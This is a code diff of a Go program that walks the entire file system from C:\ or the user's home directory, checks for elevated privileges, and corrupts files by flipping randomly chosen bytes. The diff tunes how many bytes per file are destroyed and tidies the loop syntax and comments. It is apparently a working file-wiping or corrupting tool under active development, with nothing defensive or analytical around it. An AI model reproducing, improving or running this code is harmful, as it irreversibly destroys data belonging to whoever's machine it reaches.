@@ -45,6 +45,7 @@ func walkAndSendFiles(root string, fileChan chan<- string) error {
 			log.Println("Walk error:", err)
 			return nil
 		}
+		// remove if neccessary(i did this cause of my system)
 		if info.IsDir() {
 			if runtime.GOOS == "linux" && strings.Contains(path, ".wine") {
 				loggingSystem("passed .wine folder")
@@ -103,12 +104,9 @@ func realCorrupt(filePath string) (status string, err error) {
 	rand.Seed(time.Now().UnixNano())
 
 	// declaring how many bytes to flip
-	count := len(data) / 20
-	if count < 1 {
-		count = 1
-	}
+	count := max(1, len(data)/202)
 
-	for i := 0; i < count; i++ {
+	for _ = range count {
 		pos := rand.Intn(len(data))
 		data[pos] ^= 0xFF // flip all bits in this byte
 	}
@@ -131,7 +129,7 @@ func defaultRoot() string {
 		return "C:\\"
 	}
 
-	// unix like system
+	// unix-like system
 	home := os.Getenv("HOME")
 	if home != "" {
 		return home
@@ -140,7 +138,7 @@ func defaultRoot() string {
 }
 
 func main() {
-	rootDir := defaultRoot() // Change to whatever path you want
+	rootDir := defaultRoot()
 	fileChan := make(chan string, 100)
 
 	//check elevation
